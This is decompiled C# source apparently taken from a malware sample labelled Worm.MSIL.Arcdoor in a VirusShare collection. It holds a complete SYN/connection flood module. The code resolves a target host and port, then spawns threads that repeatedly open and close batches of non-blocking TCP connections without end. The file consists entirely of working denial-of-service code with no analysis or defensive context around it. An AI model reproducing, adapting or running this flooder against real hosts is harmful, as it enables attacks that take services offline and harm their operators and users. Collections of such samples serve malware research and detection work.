// Decompiled with JetBrains decompiler
// Type: SysDriver.nSYNFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
  internal class nSYNFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static IPEndPoint IPEo;
    public static ushort uPort;
    private static nSYNFlood.SYNRequest[] SYNClass;
    public static int iSSockets;
    public static int iThreads;

    public static void StartSYNFlood()
    {
      try
      {
        nSYNFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nSYNFlood.sFHost).AddressList[0], (int) nSYNFlood.uPort);
      }
      catch
      {
        nSYNFlood.IPEo = new IPEndPoint(IPAddress.Parse(nSYNFlood.sFHost), (int) nSYNFlood.uPort);
      }
      nSYNFlood.tFloodingThread = new Thread[nSYNFlood.iThreads];
      nSYNFlood.tFloodingJob = new ThreadStart[nSYNFlood.iThreads];
      nSYNFlood.SYNClass = new nSYNFlood.SYNRequest[nSYNFlood.iThreads];
      for (int index = 0; index < nSYNFlood.iThreads; ++index)
      {
        nSYNFlood.SYNClass[index] = new nSYNFlood.SYNRequest(nSYNFlood.IPEo, nSYNFlood.iSSockets);
        nSYNFlood.tFloodingJob[index] = new ThreadStart(nSYNFlood.SYNClass[index].Send);
        nSYNFlood.tFloodingThread[index] = new Thread(nSYNFlood.tFloodingJob[index]);
        nSYNFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopSYNFlood()
    {
      for (int index = 0; index < nSYNFlood.iThreads; ++index)
      {
        try
        {
          nSYNFlood.tFloodingThread[index].Abort();
          nSYNFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class SYNRequest
    {
      private IPEndPoint IPEo;
      private Socket[] pSocket;
      private int iSSockets;

      public SYNRequest(IPEndPoint tIPEo, int tSSockets)
      {
        this.IPEo = tIPEo;
        this.iSSockets = tSSockets;
      }

      private void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
        while (true)
        {
          try
          {
            this.pSocket = new Socket[this.iSSockets];
            for (int index = 0; index < this.iSSockets; ++index)
            {
              this.pSocket[index] = new Socket(this.IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this.pSocket[index].Blocking = false;
              AsyncCallback callback = new AsyncCallback(this.OnConnect);
              this.pSocket[index].BeginConnect((EndPoint) this.IPEo, callback, (object) this.pSocket[index]);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iSSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.iSSockets; ++index)
            {
              try
              {
                if (this.pSocket[index].Connected)
                  this.pSocket[index].Disconnect(false);
                this.pSocket[index].Close();
                this.pSocket[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
